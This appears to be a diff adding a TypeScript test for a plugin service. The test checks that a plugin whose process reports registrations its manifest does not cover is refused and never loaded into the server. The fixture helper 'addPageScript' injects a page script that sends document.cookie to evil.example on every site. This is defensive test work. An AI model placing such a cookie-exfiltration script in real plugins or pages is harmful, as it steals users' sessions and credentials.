@@ -9,6 +9,7 @@ import {
   createFakePluginHostProcess,
   type FakePluginHostProcess,
 } from "../../helpers/fake-plugin-host.js";
+import type { PluginMessage } from "../../../src/services/plugins/plugin-protocol.js";
 import {
   createPluginService,
   type PluginService,
@@ -266,7 +267,68 @@ describe("a plugin whose process does not work out", () => {
       plugins.list().find((plugin) => plugin.id === "remote")?.statusDetail,
     ).toBeNull();
   }, 30_000);
+
+  /**
+   * The one failure out there that must *not* land in the server.
+   *
+   * Everything above is a process that did not work out, and for those the
+   * server is the floor. A process that works fine and reports registrations
+   * its manifest does not cover is the opposite case: falling back would load
+   * exactly that plugin into the realm holding the database handle and the
+   * machine keys, and would let a plugin choose that by lying. So the load
+   * ends, loudly, with nothing registered anywhere.
+   */
+  it("does not run in the server when its snapshot is refused", async () => {
+    const { service: plugins, rootDir } = await startService({
+      spawnPluginHost: () =>
+        createFakePluginHostProcess(undefined, { rig: addPageScript }).child,
+    });
+
+    const entry = await plugins.installPath(rootDir);
+
+    expect(entry.status).toBe("error");
+    expect(entry.statusDetail).toMatch(
+      /reported registrations its declaration does not cover/,
+    );
+    expect(entry.statusDetail).toMatch(/pageScript\.register/);
+    // Neither out there nor in here: the page script never reaches the app,
+    // and the plugin's honest registration is not serving either.
+    expect(plugins.listPageScriptContributions()).toEqual([]);
+    expect(plugins.listContextMenuItemContributions()).toEqual([]);
+    expect(backInTheServer(plugins)).toBe(false);
+  }, 30_000);
 });
+
+/**
+ * A plugin that writes its own bootstrap reply.
+ *
+ * The fixture's factory registers one context menu item and nothing else; this
+ * adds the registration issue #20 is about — a page script on every site, from
+ * a manifest that declares neither the permission nor the site — to the frame
+ * on its way out, which is what a plugin whose code runs in that process can
+ * do.
+ */
+function addPageScript(message: PluginMessage): PluginMessage {
+  if (message.kind !== "result") return message;
+  const value = message.value;
+  if (typeof value !== "object" || value === null || Array.isArray(value)) {
+    return message;
+  }
+  if (!("pageScripts" in value)) return message;
+  return {
+    ...message,
+    value: {
+      ...value,
+      pageScripts: [
+        {
+          id: "exfiltrate",
+          matches: ["*://*/*"],
+          code: "fetch('https://evil.example/?c=' + document.cookie)",
+        },
+      ],
+    },
+  };
+}
 
 /** `getApi` throws for a plugin in its own process; here that is an answer. */
 function backInTheServer(plugins: PluginService): boolean {
